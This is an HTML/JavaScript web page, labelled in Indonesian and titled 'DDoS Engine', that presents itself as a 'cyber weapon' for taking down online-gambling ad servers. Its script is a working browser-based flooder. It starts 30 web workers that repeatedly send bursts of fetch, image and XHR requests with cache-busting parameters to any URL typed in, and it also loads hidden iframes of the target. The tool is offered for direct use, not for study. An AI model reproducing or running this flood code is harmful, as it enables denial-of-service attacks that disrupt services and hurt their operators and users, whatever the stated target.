<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Engine · Cyber Neon</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;600;700&display=swap" rel="stylesheet">
    <style>
        /* ===== RESET & BASE ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: #08040e;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Rajdhani', sans-serif;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }
        /* ===== CANVAS PARTIKEL ===== */
        #particles-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        /* ===== GLOW ORBS ===== */
        .glow-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(120px);
            pointer-events: none;
            z-index: 0;
        }
        .orb1 {
            width: 500px; height: 500px;
            background: #ff00c1;
            top: -200px; right: -200px;
            opacity: 0.10;
            animation: float 12s infinite alternate;
        }
        .orb2 {
            width: 600px; height: 600px;
            background: #00ffff;
            bottom: -250px; left: -250px;
            opacity: 0.07;
            animation: float 16s infinite alternate-reverse;
        }
        @keyframes float {
            0% { transform: translate(0,0) scale(1); }
            100% { transform: translate(70px, 50px) scale(1.4); }
        }

        /* ===== CARD UTAMA ===== */
        .card {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 860px;
            background: rgba(10, 4, 22, 0.65);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(0, 255, 255, 0.15);
            border-radius: 48px;
            padding: 50px 45px;
            box-shadow: 
                0 0 60px rgba(0, 255, 255, 0.04),
                inset 0 0 80px rgba(255, 0, 200, 0.02);
            transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
        }
        .card:hover {
            border-color: rgba(0, 255, 255, 0.35);
            box-shadow: 0 0 100px rgba(0, 255, 255, 0.08), 0 0 200px rgba(255, 0, 200, 0.04);
        }

        /* ===== BADGE ===== */
        .badge {
            display: inline-block;
            background: rgba(255, 0, 80, 0.12);
            border: 1px solid #ff0055;
            color: #ff0055;
            padding: 6px 24px;
            border-radius: 40px;
            font-size: 11px;
            letter-spacing: 5px;
            text-transform: uppercase;
            margin-bottom: 24px;
            font-weight: 700;
            animation: pulse-border 2.4s infinite;
            box-shadow: 0 0 20px rgba(255, 0, 85, 0.15);
        }
        @keyframes pulse-border {
            0% { box-shadow: 0 0 0 0 rgba(255,0,85,0.3); }
            60% { box-shadow: 0 0 30px 8px rgba(255,0,85,0); }
            100% { box-shadow: 0 0 0 0 rgba(255,0,85,0); }
        }

        /* ===== JUDUL GLITCH ===== */
        .glitch-wrapper {
            position: relative;
            display: inline-block;
        }
        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.4rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00ffff, #a855f7, #ff00c1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 4px;
            margin-bottom: 4px;
            position: relative;
            display: inline-block;
        }
        .glitch-wrapper::before,
        .glitch-wrapper::after {
            content: "DDOS ENGINE";
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: transparent;
            -webkit-text-fill-color: transparent;
            -webkit-background-clip: text;
            background: linear-gradient(135deg, #00ffff, #a855f7, #ff00c1);
            -webkit-background-clip: text;
            opacity: 0.5;
            pointer-events: none;
        }
        .glitch-wrapper::before {
            animation: glitch1 3.2s infinite linear alternate-reverse;
            clip-path: polygon(0 0, 100% 0, 100% 30%, 0 30%);
        }
        .glitch-wrapper::after {
            animation: glitch2 2.8s infinite linear alternate-reverse;
            clip-path: polygon(0 70%, 100% 70%, 100% 100%, 0 100%);
        }
        @keyframes glitch1 {
            0% { transform: translate(0); }
            20% { transform: translate(-4px, 3px); }
            40% { transform: translate(4px, -2px); }
            60% { transform: translate(-3px, 4px); }
            80% { transform: translate(5px, -3px); }
            100% { transform: translate(-2px, 2px); }
        }
        @keyframes glitch2 {
            0% { transform: translate(0); }
            30% { transform: translate(5px, -3px); }
            60% { transform: translate(-5px, 4px); }
            100% { transform: translate(3px, -4px); }
        }
        .subtitle {
            color: rgba(255,255,255,0.25);
            font-size: 0.85rem;
            letter-spacing: 8px;
            text-transform: uppercase;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            padding-bottom: 24px;
            margin-bottom: 30px;
            font-weight: 300;
        }

        /* ===== INPUT GROUP ===== */
        .input-group {
            background: rgba(0, 0, 0, 0.6);
            border-radius: 60px;
            padding: 4px 4px 4px 28px;
            display: flex;
            align-items: center;
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: all 0.4s ease;
            margin-bottom: 30px;
            backdrop-filter: blur(4px);
        }
        .input-group:focus-within {
            border-color: #00ffff;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.06), inset 0 0 30px rgba(0, 255, 255, 0.02);
        }
        .input-group input {
            width: 100%;
            background: transparent;
            border: none;
            padding: 18px 0;
            color: #fff;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.1rem;
            outline: none;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        .input-group input::placeholder {
            color: rgba(255,255,255,0.15);
            font-weight: 300;
        }
        .input-group .icon {
            color: #00ffff;
            margin-right: 14px;
            font-size: 1.5rem;
            opacity: 0.6;
            transition: 0.3s;
        }
        .input-group:focus-within .icon { opacity: 1; }

        /* ===== TOMBOL ===== */
        .action-group {
            display: flex;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 34px;
        }
        .btn {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            padding: 18px 52px;
            border: none;
            border-radius: 60px;
            font-size: 0.9rem;
            letter-spacing: 2px;
            cursor: pointer;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
            background: rgba(255,255,255,0.02);
        }
        .btn-primary {
            background: linear-gradient(135deg, #ff0055, #a855f7);
            color: #fff;
            box-shadow: 0 0 40px rgba(255, 0, 85, 0.25);
        }
        .btn-primary:hover {
            transform: scale(1.06) translateY(-2px);
            box-shadow: 0 0 70px rgba(255, 0, 85, 0.5), 0 10px 30px rgba(0,0,0,0.3);
        }
        .btn-secondary {
            background: rgba(255,255,255,0.03);
            color: #c0c0c0;
            border: 1px solid rgba(255,255,255,0.06);
        }
        .btn-secondary:hover {
            background: rgba(255,255,255,0.08);
            color: #fff;
            border-color: rgba(255,255,255,0.2);
            transform: scale(1.03);
        }
        /* Ripple */
        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.25);
            transform: scale(0);
            animation: ripple-anim 0.7s linear;
            pointer-events: none;
        }
        @keyframes ripple-anim {
            to { transform: scale(5); opacity: 0; }
        }

        /* ===== STATISTIK ===== */
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            background: rgba(0,0,0,0.35);
            border-radius: 28px;
            padding: 28px;
            margin-bottom: 24px;
            border: 1px solid rgba(255,255,255,0.03);
            backdrop-filter: blur(4px);
        }
        .stat-item {
            text-align: left;
            display: flex;
            flex-direction: column;
        }
        .stat-label {
            color: rgba(255,255,255,0.2);
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 4px;
            font-weight: 600;
            margin-bottom: 6px;
        }
        .stat-value {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.6rem;
            font-weight: 700;
            color: #00ffff;
            text-shadow: 0 0 40px rgba(0, 255, 255, 0.15);
            line-height: 1.1;
            transition: 0.2s;
        }
        .stat-value.gold {
            color: #fbbf24;
            text-shadow: 0 0 40px rgba(251, 191, 36, 0.2);
        }
        #status {
            grid-column: span 2;
            background: rgba(0,255,0,0.02);
            padding: 16px 20px;
            border-radius: 20px;
            border-left: 4px solid #00ff41;
            color: #00ff41;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 700;
            font-size: 1.1rem;
            text-align: center;
            transition: 0.3s;
            letter-spacing: 0.5px;
            backdrop-filter: blur(2px);
        }
        /* Progress Bar */
        .progress-wrap {
            grid-column: span 2;
            height: 6px;
            background: rgba(255,255,255,0.04);
            border-radius: 6px;
            overflow: hidden;
            margin-top: 2px;
            position: relative;
        }
        #progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ffff, #a855f7, #ff00c1);
            border-radius: 6px;
            transition: width 0.4s ease;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
            position: relative;
        }
        #progress-bar::after {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            animation: shimmer 2s infinite;
        }
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* ===== FOOTER ===== */
        .footer {
            margin-top: 28px;
            padding-top: 22px;
            border-top: 1px solid rgba(255,255,255,0.03);
            font-family: 'Orbitron', sans-serif;
            font-size: 0.7rem;
            letter-spacing: 2px;
            color: rgba(255,255,255,0.08);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .footer span {
            background: linear-gradient(135deg, #ff00c1, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 900;
            text-shadow: 0 0 60px rgba(255, 0, 193, 0.1);
        }
        .footer .version {
            color: rgba(255,255,255,0.08);
            font-size: 0.6rem;
            letter-spacing: 3px;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 680px) {
            .card { padding: 30px 20px; }
            h1 { font-size: 2.2rem; }
            .glitch-wrapper::before,
            .glitch-wrapper::after { content: "DDOS ENGINE"; font-size: 2.2rem; }
            .stats-grid {
                grid-template-columns: 1fr;
                gap: 14px;
                padding: 20px;
            }
            #status { grid-column: span 1; }
            .btn {
                padding: 14px 32px;
                font-size: 0.75rem;
                letter-spacing: 1px;
            }
            .footer { flex-direction: column; gap: 8px; text-align: center; }
            .subtitle { font-size: 0.7rem; letter-spacing: 5px; }
            .stat-value { font-size: 2rem; }
            .badge { font-size: 10px; padding: 4px 18px; }
        }
    </style>
</head>
<body>
    <!-- Canvas Partikel -->
    <canvas id="particles-canvas"></canvas>

    <!-- Glow Orbs -->
    <div class="glow-orb orb1"></div>
    <div class="glow-orb orb2"></div>

    <div class="card">
        <!-- Badge -->
        <div class="badge">⚡ SENJATA SIBER ⚡</div>

        <!-- Judul Glitch -->
        <div class="glitch-wrapper">
            <h1>DDOS ENGINE</h1>
        </div>
        <div class="subtitle">~ Penghancur Iklan Judi Online ~</div>

        <!-- Input URL -->
        <div class="input-group">
            <span class="icon">🌐</span>
            <input type="text" id="targetUrl" value="https://target-iklan-judi.com/banner.gif" placeholder="Tempel URL target iklan judi...">
        </div>

        <!-- Tombol Aksi -->
        <div class="action-group">
            <button class="btn btn-primary" id="btn-start">🔥 LANCARKAN</button>
            <button class="btn btn-secondary" id="btn-stop">⏹ HENTIKAN</button>
        </div>

        <!-- Statistik & Progress -->
        <div class="stats-grid">
            <div class="stat-item">
                <div class="stat-label">Total Request</div>
                <div class="stat-value gold" id="counter">0</div>
            </div>
            <div class="stat-item">
                <div class="stat-label">Status Server</div>
                <div class="stat-value" style="font-size:1.4rem; color:#a855f7;" id="status">SIAP MENYERANG</div>
            </div>
            <div class="progress-wrap">
                <div id="progress-bar" style="width:0%;"></div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            <span>𝐱𝙈𝙎𝙃𝙖𝙤𝙢𝙞</span>
            <span class="version">v3.1 · neon</span>
        </div>
    </div>

    <script>
        // ============================================================
        // 1. PARTIKEL CANVAS (background animasi) - TETAP
        // ============================================================
        const canvas = document.getElementById('particles-canvas');
        const ctx = canvas.getContext('2d');
        let w, h;
        function resize() {
            w = canvas.width = window.innerWidth;
            h = canvas.height = window.innerHeight;
        }
        resize();
        window.addEventListener('resize', resize);

        const particles = [];
        const numParticles = 180;
        for (let i = 0; i < numParticles; i++) {
            particles.push({
                x: Math.random() * w,
                y: Math.random() * h,
                vx: (Math.random() - 0.5) * 0.6,
                vy: (Math.random() - 0.5) * 0.6,
                r: Math.random() * 2 + 0.5,
                a: Math.random() * 0.5 + 0.1
            });
        }
        function drawParticles() {
            ctx.clearRect(0, 0, w, h);
            particles.forEach(p => {
                p.x += p.vx;
                p.y += p.vy;
                if (p.x < 0 || p.x > w) p.vx *= -1;
                if (p.y < 0 || p.y > h) p.vy *= -1;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(0, 255, 255, ${p.a})`;
                ctx.fill();
            });
            for (let i = 0; i < particles.length; i++) {
                for (let j = i+1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const dist = Math.sqrt(dx*dx + dy*dy);
                    if (dist < 120) {
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = `rgba(0, 255, 255, ${0.08 * (1 - dist/120)})`;
                        ctx.lineWidth = 0.5;
                        ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(drawParticles);
        }
        drawParticles();

        // ============================================================
        // 2. RIPPLE EFEK TOMBOL - TETAP
        // ============================================================
        document.querySelectorAll('.btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                const rect = this.getBoundingClientRect();
                const ripple = document.createElement('span');
                const size = Math.max(rect.width, rect.height);
                ripple.style.width = ripple.style.height = size + 'px';
                ripple.style.left = (e.clientX - rect.left - size/2) + 'px';
                ripple.style.top = (e.clientY - rect.top - size/2) + 'px';
                ripple.classList.add('ripple');
                this.appendChild(ripple);
                setTimeout(() => ripple.remove(), 700);
            });
        });

        // ============================================================
        // 3. LOGIKA DDOS - TETAP (tidak diubah)
        // ============================================================
        let attackActive = false;
        let requestCount = 0;
        let intervalId = null;
        let workers = [];
        const counterEl = document.getElementById('counter');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progress-bar');

        const workerScript = `
            self.onmessage = function(e) {
                const url = e.data;
                setInterval(() => {
                    for(let i=0; i<85; i++) {
                        fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(() => {});
                        const img = new Image();
                        img.src = url + '?rand=' + Math.random();
                        const xhr = new XMLHttpRequest();
                        xhr.open('GET', url + '?rand=' + Math.random(), true);
                        xhr.send();
                    }
                    self.postMessage('hit');
                }, 70);
            };
        `;
        const workerBlob = new Blob([workerScript], { type: 'application/javascript' });
        const workerUrl = URL.createObjectURL(workerBlob);

        function animateCounter(target) {
            const current = parseInt(counterEl.innerText.replace(/,/g, '')) || 0;
            const diff = target - current;
            const steps = 20;
            let step = 0;
            const interval = setInterval(() => {
                step++;
                const val = current + Math.round(diff * (step / steps));
                counterEl.innerText = val.toLocaleString();
                if (step >= steps) {
                    clearInterval(interval);
                    counterEl.innerText = target.toLocaleString();
                }
            }, 20);
        }

        function updateStatus(msg, isError = false, progress = null) {
            statusEl.innerText = msg;
            statusEl.style.color = isError ? '#ff0055' : '#00ffff';
            statusEl.style.borderLeftColor = isError ? '#ff0055' : '#00ffff';
            if (progress !== null) {
                progressBar.style.width = Math.min(progress, 100) + '%';
            }
        }

        function startDDoS() {
            if (attackActive) return;
            const target = document.getElementById('targetUrl').value.trim();
            if (!target || target === '') {
                alert('⚠️ Masukkan URL target iklan judi terlebih dahulu!');
                return;
            }
            attackActive = true;
            requestCount = 0;
            counterEl.innerText = '0';
            updateStatus(`🟢 SERANGAN AKTIF → ${target}`, false, 0);

            for (let i = 0; i < 30; i++) {
                const worker = new Worker(workerUrl);
                worker.postMessage(target);
                worker.onmessage = function(e) {
                    if (e.data === 'hit') {
                        requestCount += 85;
                        animateCounter(requestCount);
                        const prog = Math.min((requestCount / 500000) * 100, 95);
                        progressBar.style.width = prog + '%';
                        if (requestCount > 500000) {
                            progressBar.style.background = 'linear-gradient(90deg, #ff00c1, #ff0055)';
                        }
                    }
                };
                workers.push(worker);
            }

            intervalId = setInterval(() => {
                if (!attackActive) return;
                for (let i = 0; i < 20; i++) {
                    const iframe = document.createElement('iframe');
                    iframe.src = target + '?iframe=' + Math.random() + '_' + Date.now();
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 600);
                    requestCount++;
                    animateCounter(requestCount);
                }
            }, 300);
        }

        function stopDDoS() {
            attackActive = false;
            clearInterval(intervalId);
            workers.forEach(w => w.terminate());
            workers = [];
            updateStatus(`⏹ DIHENTIKAN · Total: ${requestCount.toLocaleString()} request`, false, 100);
            progressBar.style.width = '100%';
            setTimeout(() => {
                progressBar.style.width = '0%';
            }, 1500);
        }

        document.getElementById('btn-start').addEventListener('click', startDDoS);
        document.getElementById('btn-stop').addEventListener('click', stopDDoS);
    </script>
</body>
</html>
